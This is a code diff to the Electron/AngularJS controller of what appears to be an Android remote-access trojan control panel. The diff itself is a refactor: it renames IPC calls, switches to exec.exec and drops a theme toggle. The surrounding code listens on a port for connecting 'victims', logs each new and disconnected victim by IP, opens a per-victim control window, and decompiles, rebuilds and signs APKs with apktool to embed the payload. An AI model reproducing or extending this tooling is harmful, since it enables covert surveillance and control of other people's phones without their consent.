@@ -1,28 +1,8 @@
 var app = angular.module('myapp', []);
-const {
-    remote
-} = require('electron');
-var dialog = remote.dialog;
-const {
-    ipcRenderer
-} = require('electron');
-var fs = require('fs-extra')
-var victimsList = remote.require('./main');
-const CONSTANTS = require(__dirname + '/assets/js/Constants')
-var homedir = require('node-homedir');
-const {
-    dirname
-} = require('path');
-var dir = require("path");
-const {
-    promisify
-} = require('util');
-const exec = promisify(require('child_process').exec);
-var xml2js = require('xml2js');
-var readdirp = require('readdirp');
+
 //--------------------------------------------------------------
 var viclist = {};
-var dataPath = dir.join(homedir(), CONSTANTS.dataDir);
+var dataPath = dir.join(dirs.homedir(), CONSTANTS.dataDir);
 var downloadsPath = dir.join(dataPath, CONSTANTS.downloadPath);
 var outputPath = dir.join(dataPath, CONSTANTS.outputApkPath);
 var logPath = dir.join(dataPath, CONSTANTS.outputLogsPath);
@@ -48,35 +28,26 @@ app.controller("AppCtrl", ($scope) => {
     $('.ui.dropdown')
         .dropdown();
 
-    const window = remote.getCurrentWindow();
+    
     $appCtrl.close = () => {
-        window.close();
+        curWindow.close();
     };
 
     $appCtrl.minimize = () => {
-        window.minimize();
+        curWindow.minimize();
     };
 
 
 
     $appCtrl.maximize = () => {
-        if (window.isMaximized()) {
-            window.unmaximize(); // Restore the window size
+        if (curWindow.isMaximized()) {
+            curWindow.unmaximize(); // Restore the window size
         } else {
-            window.maximize(); // Maximize the window
+            curWindow.maximize(); // Maximize the window
         }
     };
 
 
-    // switch between dark and light theme
-    $appCtrl.ChangeTheme = () => {
-        if(document.body.classList.contains('dark')){
-            document.body.className = document.body.className.replace("dark","");
-        }
-        else{
-            document.body.classList.add("dark");
-        }
-    }
 
     // when user clicks Listen button
     $appCtrl.Listen = (port) => {
@@ -84,7 +55,7 @@ app.controller("AppCtrl", ($scope) => {
             port = CONSTANTS.defaultPort;
         }
 
-        ipcRenderer.send("SocketIO:Listen", port);
+        ipcRenderer.ipcSend("SocketIO:Listen", port);
     };
 
     $appCtrl.StopListening = (port) => {
@@ -92,47 +63,47 @@ app.controller("AppCtrl", ($scope) => {
             port = CONSTANTS.defaultPort;
         }
 
-        ipcRenderer.send("SocketIO:Stop", port);
+        ipcRenderer.ipcSend("SocketIO:Stop", port);
     };
 
-    ipcRenderer.on("SocketIO:Listen", (event, message) => {
+    ipcRenderer.ipcROn("SocketIO:Listen", (event, message) => {
         $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
         $appCtrl.isListen = true;
         $appCtrl.$apply();
     });
 
-    ipcRenderer.on("SocketIO:Stop", (event, message) => {
+    ipcRenderer.ipcROn("SocketIO:Stop", (event, message) => {
         $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
         $appCtrl.isListen = false;
         $appCtrl.$apply();
     });
 
-    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
+    ipcRenderer.ipcROn('SocketIO:NewVictim', (event, index) => {
         viclist[index] = victimsList.getVictim(index);
         $appCtrl.Log('[¡] New victim from ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
         $appCtrl.$apply();
     });
 
-    ipcRenderer.on("SocketIO:ListenError", (event, error) => {
+    ipcRenderer.ipcROn("SocketIO:ListenError", (event, error) => {
         $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
         $appCtrl.isListen = false;
         $appCtrl.$apply();
     });
 
-    ipcRenderer.on("SocketIO:StopError", (event, error) => {
+    ipcRenderer.ipcROn("SocketIO:StopError", (event, error) => {
         $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
         $appCtrl.isListen = false;
         $appCtrl.$apply();
     });
 
-    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
+    ipcRenderer.ipcROn('SocketIO:RemoveVictim', (event, index) => {
         $appCtrl.Log('[¡] Victim Disconnected ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
         delete viclist[index];
         $appCtrl.$apply();
     });
 
     $appCtrl.openLab = (index) => {
-        ipcRenderer.send('openLabWindow', 'lab.html', index);
+        ipcRenderer.ipcSend('openLabWindow', 'lab.html', index);
     };
 
 
@@ -337,7 +308,7 @@ app.controller("AppCtrl", ($scope) => {
 
         try {
             delayedLog('[★] Emptying the Apktool Framework Directory...');
-            exec('java -jar "' + CONSTANTS.apktoolJar + '" empty-framework-dir --force "' + '"',
+            exec.exec('java -jar "' + CONSTANTS.apktoolJar + '" empty-framework-dir --force "' + '"',
                 (error, stderr, stdout) => {
                     if (error) throw error;
                 });
@@ -349,7 +320,7 @@ app.controller("AppCtrl", ($scope) => {
         delayedLog('[★] Building ' + CONSTANTS.apkName + '...');
         var createApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath,
             CONSTANTS.apkName) + '" --use-aapt2 "' + '"';
-        exec(createApk,
+        exec.exec(createApk,
             (error, stdout, stderr) => {
                 if (error !== null) {
                     delayedLog('[x] Building Failed', CONSTANTS.logStatus.FAIL);
@@ -361,7 +332,7 @@ app.controller("AppCtrl", ($scope) => {
 
                 delayedLog('[★] Signing ' + CONSTANTS.apkName + '...');
                 var signApk = 'java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, CONSTANTS.apkName) + '"';
-                exec(signApk, (error, stdout, stderr) => {
+                exec.exec(signApk, (error, stdout, stderr) => {
                     if (error !== null) {
                         delayedLog('[x] Signing Failed', CONSTANTS.logStatus.FAIL);
                         writeErrorLog(error, 'Signing');
@@ -1017,7 +988,7 @@ app.controller("AppCtrl", ($scope) => {
 
                             var decompileApk = 'java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"';
 
-                            exec(decompileApk, (error, stdout, stderr) => {
+                            exec.exec(decompileApk, (error, stdout, stderr) => {
                                 if (error !== null) {
                                     delayedLog('[x] Decompiling Failed!', CONSTANTS.logStatus.FAIL);
                                     writeErrorLog(error, 'Decompiling');
@@ -1043,7 +1014,7 @@ app.controller("AppCtrl", ($scope) => {
 
 // Function to check if Java version 11 is installed
 function checkJavaVersion(callback) {
-    exec('java -version',
+    exec.exec('java -version',
         (error, stdout, stderr) => {
             if (error) {
                 callback(new Error('Java is not installed or not accessible.'));
